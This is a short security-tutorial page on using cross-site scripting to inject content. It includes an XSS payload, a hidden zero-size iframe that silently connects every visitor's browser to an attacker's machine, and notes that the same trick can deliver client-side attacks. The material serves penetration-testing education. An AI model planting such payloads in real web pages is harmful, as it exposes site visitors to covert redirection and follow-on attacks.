---
description: Leveraging XSS for injecting content into victims' browsers
---

# Content Injection

## Redirection

XSS vulnerabilities are often used to deliver client-side attacks as they allow for the redirection of a victim’s browser to a location of the attacker’s choosing. A stealthy alternative to a redirect is to inject an invisible [iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) like the following into an XSS payload. An iframe is used to embed another file, such as an image or another HTML file, within the current HTML document.

#### Example

Injecting an invisible iframe which redirects the victim's browser to an attacker's machine:

```html
<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
```

In this case, “report” is a file hyperlinked to an attacking machine, and the iframe is invisible because it has no size since the height and width are set to zero.

Once this payload has been submitted, any user that visits the page will connect back to the attacking machine.

This example is simple in that it simply redirects to a listening machine, but this same injection could be used to redirect the victim browser to a client-side attack or to an information gathering script.
